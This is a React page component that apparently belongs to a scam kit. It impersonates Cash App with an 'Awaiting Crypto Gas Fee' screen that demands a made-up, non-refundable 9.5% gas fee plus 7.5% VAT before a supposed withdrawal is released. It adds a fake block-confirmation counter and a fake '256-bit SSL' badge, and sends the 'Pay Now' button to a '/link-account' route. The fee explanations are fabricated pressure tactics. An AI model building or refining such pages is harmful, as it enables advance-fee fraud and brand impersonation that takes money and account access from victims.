import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { loadInvoiceContext } from "@/hooks/use-transactions";

const GAS_FEE_RATE = 0.095;
const VAT_RATE = 0.075;

export default function CashAppGasFee() {
  const [, navigate] = useLocation();

  const ctx = loadInvoiceContext();
  const withdrawalAmount = ctx?.usdAmount && ctx.usdAmount > 0 ? ctx.usdAmount : 20436.30;

  const gasFee = Math.round(withdrawalAmount * GAS_FEE_RATE * 100) / 100;
  const vatAmount = Math.round(withdrawalAmount * VAT_RATE * 100) / 100;
  const totalGasDue = Math.round((gasFee + vatAmount) * 100) / 100;

  const [dots, setDots] = useState("");
  const dotsRef = useRef(0);

  useEffect(() => {
    const interval = setInterval(() => {
      dotsRef.current = (dotsRef.current + 1) % 4;
      setDots(".".repeat(dotsRef.current));
    }, 600);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="min-h-screen bg-[#00D632] flex flex-col">
      <div className="flex items-center justify-between px-4 py-3">
        <button
          onClick={() => navigate("/invoice")}
          className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center"
        >
          <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M15 19l-7-7 7-7" />
          </svg>
        </button>
        <div className="flex items-center gap-2">
          <div className="w-8 h-8 rounded-lg bg-white flex items-center justify-center">
            <span className="text-[#00D632] font-black text-lg">$</span>
          </div>
          <span className="text-white font-bold text-lg tracking-tight">Cash App</span>
        </div>
        <div className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center">
          <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 5v.01M12 12v.01M12 19v.01" />
          </svg>
        </div>
      </div>

      <div className="flex-1 flex flex-col items-center justify-center px-6 pb-8">
        <div className="w-20 h-20 rounded-full bg-white/20 flex items-center justify-center mb-6 animate-pulse">
          <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
          </svg>
        </div>

        <h1 className="text-white text-2xl font-bold mb-2 text-center">
          Awaiting Crypto Gas Fee{dots}
        </h1>
        <p className="text-white/70 text-sm text-center mb-8 max-w-xs">
          A blockchain network gas fee is required to process and confirm your crypto withdrawal on-chain.
        </p>

        <div className="w-full max-w-sm bg-white rounded-3xl shadow-2xl overflow-hidden">
          <div className="px-6 pt-6 pb-4">
            <div className="flex items-center gap-3 mb-5">
              <div className="w-10 h-10 rounded-full bg-[#00D632]/10 flex items-center justify-center">
                <svg className="w-5 h-5 text-[#00D632]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                </svg>
              </div>
              <div>
                <p className="text-[#1A1A1A] font-bold text-sm">Crypto Gas Fee</p>
                <p className="text-[#999] text-xs">Blockchain Network Confirmation</p>
              </div>
            </div>

            <div className="space-y-3">
              <div className="flex justify-between items-center py-2 border-b border-gray-100">
                <span className="text-[#666] text-sm">Withdrawal Amount</span>
                <span className="text-[#1A1A1A] font-semibold text-sm">
                  ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                </span>
              </div>

              <div className="flex justify-between items-center py-2 border-b border-gray-100">
                <div>
                  <span className="text-[#666] text-sm">Gas Fee ({(GAS_FEE_RATE * 100).toFixed(1)}%)</span>
                  <p className="text-[#999] text-[10px]">{(GAS_FEE_RATE * 100).toFixed(1)}% × ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
                </div>
                <span className="text-[#1A1A1A] font-semibold text-sm">
                  ${gasFee.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                </span>
              </div>

              <div className="flex justify-between items-center py-2 border-b border-gray-100">
                <div>
                  <span className="text-[#666] text-sm">VAT ({(VAT_RATE * 100).toFixed(1)}%)</span>
                  <p className="text-[#999] text-[10px]">{(VAT_RATE * 100).toFixed(1)}% × ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
                </div>
                <span className="text-[#1A1A1A] font-semibold text-sm">
                  ${vatAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                </span>
              </div>

              <div className="bg-[#F7F7F7] rounded-xl p-3 mt-2">
                <div className="flex justify-between items-center">
                  <span className="text-[#1A1A1A] font-bold text-base">Total Due</span>
                  <span className="text-[#00D632] font-black text-xl">
                    ${totalGasDue.toLocaleString("en-US", { minimumFractionDigits: 2 })}
                  </span>
                </div>
                <p className="text-[#999] text-[10px] mt-1">Gas Fee ${gasFee.toLocaleString("en-US", { minimumFractionDigits: 2 })} + VAT ${vatAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}</p>
              </div>
            </div>
          </div>

          <div className="bg-[#F7F7F7] px-6 py-4">
            <div className="flex items-start gap-3">
              <div className="w-8 h-8 rounded-full bg-amber-100 flex items-center justify-center flex-shrink-0 mt-0.5">
                <svg className="w-4 h-4 text-amber-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                </svg>
              </div>
              <p className="text-[#666] text-xs leading-relaxed">
                This gas fee covers the cost of broadcasting and confirming your transaction on the blockchain network. It is non-refundable and required before funds can be released.
              </p>
            </div>
          </div>

          <div className="px-6 py-4 space-y-3">
            <div className="flex items-center gap-3 p-3 bg-[#F7F7F7] rounded-2xl">
              <div className="w-10 h-10 rounded-full bg-[#F7931A]/10 flex items-center justify-center flex-shrink-0">
                <span className="text-[#F7931A] font-black text-sm">₿</span>
              </div>
              <div className="flex-1">
                <p className="text-[#1A1A1A] text-sm font-semibold">Bitcoin Network</p>
                <p className="text-[#999] text-xs">~10-30 min confirmation</p>
              </div>
              <div className="flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
                <span className="text-amber-600 text-xs font-semibold">Pending</span>
              </div>
            </div>

            <div className="flex items-center gap-2 justify-center py-2">
              <div className="flex gap-1">
                {[...Array(10)].map((_, i) => (
                  <div
                    key={i}
                    className={`w-2 h-2 rounded-full ${i < 7 ? "bg-[#00D632]" : "bg-gray-200"}`}
                  />
                ))}
              </div>
              <span className="text-[#999] text-xs font-medium ml-1">7/10 Blocks</span>
            </div>
          </div>

          <div className="px-6 pb-6">
            <button
              onClick={() => navigate("/link-account")}
              className="w-full py-4 bg-[#00D632] hover:bg-[#00C02E] text-white font-bold text-base rounded-2xl transition-colors shadow-lg shadow-[#00D632]/30"
            >
              Pay Now — ${totalGasDue.toLocaleString("en-US", { minimumFractionDigits: 2 })}
            </button>
            <p className="text-center text-[#999] text-xs mt-3">
              Powered by Cash App • Secure Payment
            </p>
          </div>
        </div>

        <div className="mt-6 flex items-center gap-2">
          <svg className="w-4 h-4 text-white/60" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
          </svg>
          <span className="text-white/60 text-xs">256-bit SSL Encrypted Transaction</span>
        </div>
      </div>
    </div>
  );
}
